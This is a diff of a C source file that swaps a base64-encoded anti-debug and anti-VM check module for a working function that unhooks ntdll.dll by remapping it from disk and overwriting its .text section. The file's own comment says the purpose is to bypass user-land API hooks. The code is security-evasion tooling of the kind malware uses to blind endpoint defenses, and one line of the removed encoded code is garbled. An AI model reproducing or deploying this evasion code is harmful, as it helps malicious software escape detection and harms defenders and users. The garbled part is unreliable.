@@ -1,20 +1,63 @@
-I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHdpbnRlcm5sLmg+CiNp
-bmNsdWRlIDxzdGRpby5oPgoKLy8gRm94J3MgTkFUSVZFIEV2YXNpb24gTW9k
-dWxlCi8vIEFudGktRGVidWcgYW5kIEFudGktVk0gY2hlY2tzLgoKYm9vbCBJ
-c0RlYnVnZ2VkKCkgewogICAgLy8gQ2hlY2sgUEVCLT5CZWluZ0RlYnVnZ2Vk
-CiAgICBQUEVCIHBlYiA9IChQUEVCKV9fcmVhZGdzcWR3b3JkKDB4NjApOwog
-ICAgaWYgKHBlYi0+QmVpbmdEZWJ1Z2dlZCkgcmV0dXJuIHRydWU7CgogICAg
-Ly8gQ2hlY2sgTnRHbG9iYWxGbGFnCiAgICBQRElWRCAwLCAwLCBOVUxMLCAw
-LCBOVUxMKTsKICAgIFBWT0lEIG50R2xvYmFsRmxhZyA9IChQVk9JRCkoKFBZ
-VEUpcGViICsgMHgxQkMpOwogICAgaWYgKCooUERXT1JEKW50R2xvYmFsRmxh
-ZyAmIDB4NzApIHJldHVybiB0cnVlOwoKICAgIHJldHVybiBmYWxzZTsKfQoK
-Ym9vbCBJc1ZNKCkgewogICAgLy8gQ2hlY2sgQ1BVSUQgZm9yIGh5cGVydmlz
-b3IgYml0CiAgICBpbnQgY3B1SW5mb1s0XSA9IHswfTsKICAgIF9fY3B1aWQo
-Y3B1SW5mbywgMSk7CiAgICBpZiAoKGNwdUluZm9bMl0gPj4gMzEpICYgMSkg
-cmV0dXJuIHRydWU7CgogICAgLy8gQ2hlY2sgZm9yIGtub3duIFZNIE1BQyBh
-ZGRyZXNzZXMsIHJlZ2lzdHJ5IGtleXMsIGV0Yy4KICAgIHJldHVybiBmYWxz
-ZTsKfQoKaW50IG1haW4oKSB7CiAgICBpZiAoSXNEZWJ1Z2dlZCgpIHx8IElz
-Vk0oKSkgewogICAgICAgIHByaW50ZigiWy1dIEFuYWx5c2lzIGVudmlyb25t
-ZW50IGRldGVjdGVkLiBFeGl0aW5nLlxuIik7CiAgICAgICAgcmV0dXJuIC0x
-OwogICAgfQogICAgcHJpbnRmKCJbK10gRW52aXJvbm1lbnQgY2xlYW4uIFBy
-b2NlZWRpbmcuXG4iKTsKICAgIHJldHVybiAwOwp9
+#include <windows.h>
+#include <winternl.h>
+
+// Evasion Native Implementation
+// Bypasses user-land API hooks by unhooking ntdll.dll from disk.
+
+typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtect,
+    PULONG OldProtect
+);
+
+bool UnhookNtdll() {
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMapping) {
+        CloseHandle(hFile);
+        return false;
+    }
+
+    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pMapping) {
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return false;
+    }
+
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return false;
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
+    
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
+        
+        if (strcmp((char*)sectionHeader->Name, ".text") == 0) {
+            DWORD oldProtect = 0;
+            PVOID baseAddress = (PVOID)((DWORD_PTR)hNtdll + sectionHeader->VirtualAddress);
+            SIZE_T regionSize = sectionHeader->Misc.VirtualSize;
+            
+            pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+            if (!NtProtectVirtualMemory) break;
+            
+            NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+            
+            memcpy(baseAddress, (LPVOID)((DWORD_PTR)pMapping + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);
+            
+            NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &regionSize, oldProtect, &oldProtect);
+            break;
+        }
+    }
+
+    UnmapViewOfFile(pMapping);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+
+    return true;
+}
